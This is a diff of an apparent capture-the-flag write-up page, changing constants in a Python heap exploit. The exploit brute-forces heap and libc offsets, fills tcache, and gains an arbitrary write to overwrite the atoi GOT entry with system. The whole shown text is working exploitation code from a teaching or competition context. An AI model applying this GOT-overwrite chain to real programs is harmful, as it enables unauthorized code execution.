@@ -1227,8 +1227,8 @@
 </span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> conn()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Due to no leak, we bruteforce 12 bit of the heap offset and 12 bit of the libc base</span>
-</span></span><span style="display:flex;"><span>global_max_fast <span style="color:#555">=</span> <span style="color:#f60">0xf940</span>
-</span></span><span style="display:flex;"><span>system_offset <span style="color:#555">=</span> <span style="color:#f60">0xa31420</span>
+</span></span><span style="display:flex;"><span>global_max_fast <span style="color:#555">=</span> <span style="color:#f60">0xd940</span>
+</span></span><span style="display:flex;"><span>system_offset <span style="color:#555">=</span> <span style="color:#f60">0xf420</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Fill tcache[0x110] until it got full</span>
 </span></span><span style="display:flex;"><span>tcache_size <span style="color:#555">=</span> <span style="color:#f60">0x108</span>
@@ -1292,7 +1292,7 @@
 </span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(<span style="color:#f60">1</span>)<span style="color:#555">*</span><span style="color:#f60">3</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#555">+=</span> p64(atoi_got) <span style="color:#09f;font-style:italic"># Set robots[0] to atoi GOT</span>
 </span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">1</span>,payload) <span style="color:#09f;font-style:italic"># Arbitrary write</span>
-</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(system_offset)[:<span style="color:#f60">3</span>]) <span style="color:#09f;font-style:italic"># Partial overwrite atoi to system</span>
+</span></span><span style="display:flex;"><span>edit(r,<span style="color:#f60">0</span>,p64(system_offset)[:<span style="color:#f60">2</span>]) <span style="color:#09f;font-style:italic"># Partial overwrite atoi to system</span>
 </span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Now, atoi is changed to system&#39;</span>)
 </span></span><span style="display:flex;"><span>pause()
 </span></span><span style="display:flex;"><span>
